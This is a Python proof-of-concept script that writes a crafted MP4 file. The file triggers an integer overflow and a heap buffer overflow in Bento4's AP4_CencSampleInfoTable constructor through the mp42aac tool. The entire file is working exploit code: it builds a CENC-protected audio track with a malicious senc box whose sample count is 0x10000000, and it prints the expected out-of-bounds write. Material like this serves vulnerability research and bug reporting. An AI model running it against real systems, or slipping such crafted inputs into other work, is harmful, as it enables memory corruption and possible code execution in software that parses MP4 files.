#!/usr/bin/env python3
"""
PoC generator for VULN 001:
Integer Overflow in AP4_CencSampleInfoTable Constructor Leads to Heap Buffer Overflow

Vulnerable code:
  Ap4CommonEncryption.cpp line 3007:
    m_IvData.SetDataSize(m_IvSize*sample_count);
  When m_IvSize=16 and sample_count=0x10000000:
    16 * 0x10000000 = 0x100000000, truncated to 0 in 32-bit arithmetic.
  Subsequent SetIv() calls write 16 bytes into the 0-byte (or NULL) buffer.

Trigger path:
  mp42aac -> AP4_File parse -> senc atom read ->
  AP4_SencAtom constructor (stores m_SampleInfoCount=0x10000000) ->
  AP4_CencSampleDecrypter::Create -> AP4_CencSampleInfoTable::Create ->
  AP4_CencSampleEncryption::CreateSampleInfoTable ->
  new AP4_CencSampleInfoTable(..., m_SampleInfoCount=0x10000000, iv_size=16) ->
  m_IvData.SetDataSize(0) [overflow] -> SetIv() OOB write

File structure:
  ftyp + moov (CENC-protected audio track) + moof (with malicious senc) + mdat
"""

import struct
import os
import sys

OUT_DIR = os.path.dirname(os.path.abspath(__file__))
OUT_FILE = os.path.join(OUT_DIR, 'vuln_001.mp4')


def box(box_type, payload):
    """Build an MP4 box with the given 4-char type and payload bytes."""
    assert len(box_type) == 4
    size = 8 + len(payload)
    return struct.pack('>I4s', size, box_type.encode()) + payload


def full_box(box_type, version, flags, payload):
    """Build a FullBox (with version+flags) with given payload."""
    assert len(box_type) == 4
    header = struct.pack('>B3s', version, flags.to_bytes(3, 'big'))
    size = 8 + 4 + len(payload)
    return struct.pack('>I4s', size, box_type.encode()) + header + payload


# ── ftyp ─────────────────────────────────────────────────────────────────────
def make_ftyp():
    payload = b'iso6'          # major brand
    payload += struct.pack('>I', 0)  # minor version
    payload += b'isom' + b'iso6' + b'dash' + b'msdh'  # compatible brands
    return box('ftyp', payload)


# ── tenc (Track Encryption Box, version=0) ───────────────────────────────────
def make_tenc():
    payload  = b'\x00'          # reserved
    payload += b'\x00'          # reserved
    payload += b'\x01'          # default_is_protected = 1
    payload += b'\x10'          # default_per_sample_iv_size = 16
    payload += b'\x00' * 16     # default_kid (all zeros)
    return full_box('tenc', 0, 0, payload)


# ── schi (Scheme Information Box) ────────────────────────────────────────────
def make_schi():
    return box('schi', make_tenc())


# ── frma (Original Format Box) ───────────────────────────────────────────────
def make_frma():
    return box('frma', b'mp4a')


# ── schm (Scheme Type Box) ───────────────────────────────────────────────────
def make_schm():
    payload  = b'cenc'          # scheme_type
    payload += struct.pack('>I', 0x00010000)  # scheme_version
    return full_box('schm', 0, 0, payload)


# ── sinf (Protection Scheme Information Box) ─────────────────────────────────
def make_sinf():
    return box('sinf', make_frma() + make_schm() + make_schi())


# ── enca (Encrypted Audio Sample Entry) ──────────────────────────────────────
def make_enca():
    # Common audio sample entry fields (ISO 14496-12 Table 9)
    common  = b'\x00' * 6       # reserved
    common += struct.pack('>H', 1)   # data-reference-index
    common += b'\x00' * 8       # reserved (audio-specific)
    common += struct.pack('>H', 2)   # channel count = 2 (stereo)
    common += struct.pack('>H', 16)  # sample size = 16 bits
    common += struct.pack('>H', 0)   # pre-defined
    common += struct.pack('>H', 0)   # reserved
    common += struct.pack('>I', 44100 << 16)  # sample rate (fixed 16.16)

    payload = common + make_sinf()
    size = 8 + len(payload)
    return struct.pack('>I4s', size, b'enca') + payload


# ── stsd (Sample Description Box) ────────────────────────────────────────────
def make_stsd():
    entry_count = struct.pack('>I', 1)
    return full_box('stsd', 0, 0, entry_count + make_enca())


# ── Empty table boxes ─────────────────────────────────────────────────────────
def make_stts():
    return full_box('stts', 0, 0, struct.pack('>I', 0))  # 0 entries


def make_stsc():
    return full_box('stsc', 0, 0, struct.pack('>I', 0))  # 0 entries


def make_stsz():
    # sample_size=0 (variable), sample_count=0
    return full_box('stsz', 0, 0, struct.pack('>II', 0, 0))


def make_stco():
    return full_box('stco', 0, 0, struct.pack('>I', 0))  # 0 entries


# ── stbl (Sample Table Box) ───────────────────────────────────────────────────
def make_stbl():
    payload = (make_stsd() + make_stts() + make_stsc() +
               make_stsz() + make_stco())
    return box('stbl', payload)


# ── url (Data Entry URL Box, self-contained) ──────────────────────────────────
def make_url():
    # flags=0x000001 means self-contained (no actual URL string)
    return full_box('url ', 0, 1, b'')


# ── dref (Data Reference Box) ────────────────────────────────────────────────
def make_dref():
    entry_count = struct.pack('>I', 1)
    return full_box('dref', 0, 0, entry_count + make_url())


# ── dinf (Data Information Box) ──────────────────────────────────────────────
def make_dinf():
    return box('dinf', make_dref())


# ── smhd (Sound Media Header Box) ────────────────────────────────────────────
def make_smhd():
    # balance=0, reserved=0
    return full_box('smhd', 0, 0, struct.pack('>HH', 0, 0))


# ── minf (Media Information Box) ─────────────────────────────────────────────
def make_minf():
    payload = make_smhd() + make_dinf() + make_stbl()
    return box('minf', payload)


# ── hdlr (Handler Reference Box) ─────────────────────────────────────────────
def make_hdlr():
    payload  = struct.pack('>I', 0)      # pre-defined
    payload += b'soun'                   # handler_type
    payload += b'\x00' * 12             # reserved
    payload += b'\x00'                   # name (empty null-terminated string)
    return full_box('hdlr', 0, 0, payload)


# ── mdhd (Media Header Box, version=0) ───────────────────────────────────────
def make_mdhd():
    payload  = struct.pack('>I', 0)      # creation_time
    payload += struct.pack('>I', 0)      # modification_time
    payload += struct.pack('>I', 44100)  # timescale
    payload += struct.pack('>I', 0)      # duration (0 = unknown)
    payload += struct.pack('>H', 0x55C4) # language 'und'
    payload += struct.pack('>H', 0)      # pre-defined
    return full_box('mdhd', 0, 0, payload)


# ── mdia (Media Box) ─────────────────────────────────────────────────────────
def make_mdia():
    payload = make_mdhd() + make_hdlr() + make_minf()
    return box('mdia', payload)


# ── tkhd (Track Header Box, version=0) ───────────────────────────────────────
def make_tkhd(track_id=1):
    # flags=3: track enabled + in movie
    payload  = struct.pack('>I', 0)      # creation_time
    payload += struct.pack('>I', 0)      # modification_time
    payload += struct.pack('>I', track_id)
    payload += struct.pack('>I', 0)      # reserved
    payload += struct.pack('>I', 0)      # duration
    payload += b'\x00' * 8              # reserved
    payload += struct.pack('>H', 0)     # layer
    payload += struct.pack('>H', 0)     # alternate_group
    payload += struct.pack('>H', 0x0100) # volume = 1.0
    payload += struct.pack('>H', 0)     # reserved
    # identity matrix
    payload += struct.pack('>9I',
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000)
    payload += struct.pack('>II', 0, 0)  # width, height
    return full_box('tkhd', 0, 3, payload)


# ── trak (Track Box) ─────────────────────────────────────────────────────────
def make_trak(track_id=1):
    payload = make_tkhd(track_id) + make_mdia()
    return box('trak', payload)


# ── trex (Track Extends Box) ─────────────────────────────────────────────────
def make_trex(track_id=1):
    payload  = struct.pack('>I', track_id)  # track_id
    payload += struct.pack('>I', 1)          # default_sample_description_index
    payload += struct.pack('>I', 0)          # default_sample_duration
    payload += struct.pack('>I', 0)          # default_sample_size
    payload += struct.pack('>I', 0)          # default_sample_flags
    return full_box('trex', 0, 0, payload)


# ── mvex (Movie Extends Box) ──────────────────────────────────────────────────
def make_mvex():
    return box('mvex', make_trex())


# ── mvhd (Movie Header Box, version=0) ───────────────────────────────────────
def make_mvhd():
    payload  = struct.pack('>I', 0)           # creation_time
    payload += struct.pack('>I', 0)           # modification_time
    payload += struct.pack('>I', 1000)        # timescale
    payload += struct.pack('>I', 0)           # duration
    payload += struct.pack('>I', 0x00010000)  # rate = 1.0
    payload += struct.pack('>H', 0x0100)      # volume = 1.0
    payload += b'\x00' * 10                  # reserved
    # identity matrix
    payload += struct.pack('>9I',
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000)
    payload += b'\x00' * 24                  # pre-defined
    payload += struct.pack('>I', 2)           # next_track_ID
    return full_box('mvhd', 0, 0, payload)


# ── moov (Movie Box) ─────────────────────────────────────────────────────────
def make_moov():
    payload = make_mvhd() + make_trak() + make_mvex()
    return box('moov', payload)


# ── mfhd (Movie Fragment Header Box) ─────────────────────────────────────────
def make_mfhd(seq=1):
    return full_box('mfhd', 0, 0, struct.pack('>I', seq))


# ── tfhd (Track Fragment Header Box) ─────────────────────────────────────────
def make_tfhd(track_id=1):
    # flags=0x020000: default-base-is-moof
    return full_box('tfhd', 0, 0x020000, struct.pack('>I', track_id))


# ── trun (Track Fragment Run Box) ────────────────────────────────────────────
def make_trun(data_offset):
    # flags=0x000001: data-offset-present
    payload  = struct.pack('>I', 1)            # sample_count = 1
    payload += struct.pack('>i', data_offset)  # data_offset (signed)
    # No per-sample fields (no extra flags)
    return full_box('trun', 0, 0x000001, payload)


# ── senc (Sample Encryption Box) — THE MALICIOUS BOX ─────────────────────────
def make_senc():
    """
    VULNERABILITY: sample_count=0x10000000, per_sample_iv_size=16 (from tenc default)
    In AP4_CencSampleInfoTable::AP4_CencSampleInfoTable():
      m_IvData.SetDataSize(m_IvSize * sample_count)
      = SetDataSize(16 * 0x10000000) = SetDataSize(0x100000000)
      = SetDataSize(0) [32-bit truncation -> integer overflow]
    Then SetIv(0, data) writes 16 bytes to NULL/0-byte buffer -> heap OOB write.

    We set sample_count=0x10000000 in the header but provide only 1 IV (16 bytes).
    The parser reads m_SampleInfoCount from the header, stores the raw payload
    (the 16 bytes of IV), and CreateSampleInfoTable uses m_SampleInfoCount.
    """
    OVERFLOW_COUNT = 0x10000000  # 268,435,456
    IV_data = b'\x00' * 16      # 1 actual IV entry (16 bytes of zeros)

    # senc payload: sample_count (4 bytes) + IV data
    payload  = struct.pack('>I', OVERFLOW_COUNT)
    payload += IV_data
    return full_box('senc', 0, 0, payload)


# ── traf (Track Fragment Box) ─────────────────────────────────────────────────
def make_traf(moof_size):
    """
    moof_size: total size of the enclosing moof box (needed for data_offset).
    The mdat follows immediately after moof, so:
      data_offset = moof_size + 8 (mdat header size)
    """
    data_offset = moof_size + 8  # mdat header is 8 bytes
    payload = make_tfhd() + make_trun(data_offset) + make_senc()
    return box('traf', payload)


# ── moof (Movie Fragment Box) ─────────────────────────────────────────────────
def make_moof():
    """Two-pass: first compute moof size, then set correct data_offset."""
    mfhd_data = make_mfhd()

    # Estimate tfhd size
    tfhd_data = make_tfhd()

    # Estimate senc size
    senc_data = make_senc()

    # Estimate trun size (with placeholder data_offset=0)
    trun_placeholder = make_trun(0)

    # Estimate traf size
    traf_inner = tfhd_data + trun_placeholder + senc_data
    traf_size = 8 + len(traf_inner)

    # Estimate moof size
    moof_inner_size = len(mfhd_data) + traf_size
    moof_size = 8 + moof_inner_size

    # Now compute the real data_offset
    data_offset = moof_size + 8  # +8 for mdat header (size + 'mdat')

    # Build traf with correct data_offset
    trun_data = make_trun(data_offset)
    traf_payload = tfhd_data + trun_data + senc_data
    traf_data = box('traf', traf_payload)

    # Build final moof
    moof_payload = mfhd_data + traf_data
    return box('moof', moof_payload)


# ── mdat (Media Data Box) ─────────────────────────────────────────────────────
def make_mdat():
    return box('mdat', b'\x00')  # 1 byte of dummy sample data


# ── Assemble the full MP4 file ────────────────────────────────────────────────
def build_mp4():
    ftyp = make_ftyp()
    moov = make_moov()
    moof = make_moof()
    mdat = make_mdat()
    return ftyp + moov + moof + mdat


def main():
    data = build_mp4()
    with open(OUT_FILE, 'wb') as f:
        f.write(data)
    print(f'[+] Written {len(data)} bytes to {OUT_FILE}')

    # Print a brief summary of the key fields
    print(f'[+] senc sample_count = 0x10000000 ({0x10000000})')
    print(f'[+] tenc default_per_sample_iv_size = 16')
    print(f'[+] Overflow: 16 * 0x10000000 = {16 * 0x10000000:#010x} (truncates to 0)')
    print(f'[+] Expected: m_IvData.SetDataSize(0) -> SetIv() OOB write on NULL buffer')


if __name__ == '__main__':
    main()
